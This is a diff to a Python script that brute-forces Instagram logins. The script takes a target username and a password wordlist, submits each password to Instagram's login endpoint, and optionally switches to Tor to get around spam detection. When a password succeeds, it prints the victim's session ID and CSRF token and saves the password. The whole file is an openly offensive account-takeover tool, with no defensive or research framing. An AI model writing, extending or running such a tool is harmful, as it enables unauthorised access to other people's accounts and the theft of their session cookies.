@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 import os
-import sys
 import time
 import json
+import argparse
 import requests
 import threading
 from datetime import datetime
@@ -31,91 +31,105 @@ cookie_request = requests.get(instagram_url)
 csrf = cookie_request.cookies['csrftoken']
 login_header.update({"x-csrftoken" : csrf})
 
-target = input("target username: ")
-payload.update({"username" : target})
-#check_request = requests.get(f"https://www.instagram.com/{target}")#,proxies=proxy)
-#if check_request.status_code != 200:
-#    print(check_request.status_code)
-#    print("target username not found")
-#    exit()
-#elif check_request.url == f"{instagram_url}?next=/{target}/":
-#    #TOOD add proxy server 
-#    print(check_request.url)
-#    print("changing proxy server please wait")
-#    #exit()
-
-wordlist = input("wordlist path: ")
-if wordlist == "generate":
-    generate_words = ""
-    with open(f'wordlists/{target}_generated_wordlists.txt', 'a') as generated_wordlist:
-        while True:
-            words = input("> ")
-            if words == "":
-                break
-            else:
-                generated_wordlist.write(words + "\n")
-    
-    with open(f'wordlists/{target}_generated_wordlists.txt', 'r') as generated_wordlist:
-        for generated_word in generated_wordlist:
-            generated_word = generated_word.strip()
-            print(generated_word)
-else:
-    try:
-        bruteforce = open(wordlist, "r")
-    except FileNotFoundError:
-        print("wordlist path noth found")
-        exit()
-
-save = input("save tryed passwords?: ")
-
-def green(skk): 
-    return "\033[92m {}\033[00m" .format(skk)
+def green(text):
+    return "\033[92m{}\033[00m".format(text)
 
 def attack_start_notify(target):
-    os.system(f'herbe "Attack started to target: {target}"')
-def attack_hack_notify(hack):
-    os.system(f"herbe 'target password founded: {hack}'")
+    try:
+        os.system(f'herbe "Starting attack to victim: {target}"')
+        print(f"Staring attack to victim: {target}")
+    except:
+        print(f"Staring attack to victim: {target}")
 
-def main(proxy):
+def attack_hack_notify(hack):
+    try:
+        os.system(f"herbe 'target password founded: {hack}'")
+        print(f"[+] target password founded: {hack}")
+    except:
+        print(f"[+] target password founded: {hack}")
+
+def crack(save, server, password, victim):
+    global hack_request
+    if server == "enable":
+        hack_request = requests.post(instagram_url_login, data=payload, headers=login_header, proxies=proxy)
+    elif server == "disable":
+        hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
+    threading.Thread(target=attack_start_notify, args=(victim,)).start()
+    if save.lower() == "y":
+        with open(f"tryed/{victim}", "a") as tryed:
+            tryed.write(password)
+    print(f"[-] trying password: {password}")
+    time.sleep(5)
+    hack_data = json.loads(hack_request.text)
+    print(f'[{green("INFO")}]: {hack_data}')
+    return hack_data
+
+def attack(tor, target, wordlist_file, save):
     tryes = 0
-    threading.Thread(target=attack_start_notify, args=(target,)).start()
-    for hack in bruteforce:
+    for hack in wordlist_file:
         tryes += 1
         hack = hack.strip()
         # TOOD add change proxy server after every 10 tryes
         payload.update({
             "enc_password" : f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
         })
+        try:
+            if crack(save,tor, hack, target)["authenticated"]:
+                threading.Thread(target=attack_hack_notify, args=(hack,)).start()
+                cookies = hack_request.cookies
+                cookie_jar = cookies.get_dict()
+                csrf_token = cookie_jar['csrftoken']
+                print("csrf_token: ", csrf_token)
+                session_id = cookie_jar['sessionid']
+                print("session_id: ", session_id)
+                with open(f"hacked/{hack}", "a") as hacked:
+                    hacked.write(hack)
+                break
+        except KeyError:
+            time.sleep(2)
+            print("[-] instagram detected spam attack\n[+] changing server to tor (required tor)")
+            time.sleep(3)
+            # TODO make undetectable
+            crack(save, "disable", hack, target)
 
-        if proxy == "tor":
-            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header, proxies=proxy)
-        elif proxy == "default":
-            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
-        else:
-            hack_request = requests.post(instagram_url_login, data=payload, headers=login_header)
+def main():
+    # parsing arguments see ./queen.py -h
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--tor",
+                        metavar="enable or disable",
+                        type=str,
+                        required=True,
+                        help='attacking with or without tor server')
+    args = parser.parse_args()
+    target = input("[+] target username: ")
+    payload.update({"username" : target})
+    # TODO: CHECK IF USER EXIST WITH SIMPLE REQUEST
+    #check_request = requests.get(f"https://www.instagram.com/{target}")#,proxies=proxy)
+    #if check_request.status_code != 200:
+    #    print(check_request.status_code)
+    #    print("target username not found")
+    #    exit()
+    #elif check_request.url == f"{instagram_url}?next=/{target}/":
+    #    #TOOD add proxy server 
+    #    print(check_request.url)
+    #    print("changing proxy server please wait")
+    #    #exit()
 
-        print(f"[-] trying password: {hack}")
-        if save == "a":
-            with open(f"tryed/{target}", "a") as tryed:
-                tryed.write(hack)
-        time.sleep(5)
-        hack_data = json.loads(hack_request.text)
-        print(f'[{green("INFO")}]: {hack_data}')
-        if hack_data["authenticated"]:
-            print(f"[+] password founded: {hack}")
-            threading.Thread(target=attack_hack_notify, args=(hack,)).start()
-            cookies = hack_request.cookies
-            cookie_jar = cookies.get_dict()
-            csrf_token = cookie_jar['csrftoken']
-            print("csrf_token: ", csrf_token)
-            session_id = cookie_jar['sessionid']
-            print("session_id: ", session_id)
-            with open(f"hacked/{target}", "a") as hacked:
-                hacked.write(hack)
-            break
+    wordlist = input("[+] wordlist path: ")
+    try:
+        bruteforce = open(wordlist, "r")
+    except FileNotFoundError:
+        print("[-] wordlist file not found\ntrying to open wordlist.txt file")
+        try:
+            bruteforce = open(f'{wordlist}.txt', 'r')
+        except FileNotFoundError:
+            print("wordlist.txt file not found")
+            exit()
+
+    save = input("[+] do you want ot save tryed passwords(y/n): ")
+    if save.lower() == "y":
+        print(f"[+] the tryed passwords file path will be tryed/{target}.txt")
+    attack(args.tor, target, bruteforce, save)
 
 if __name__ == "__main__":
-    try:
-        main(sys.argv[1])
-    except IndexError:
-        main("default")
+    main()
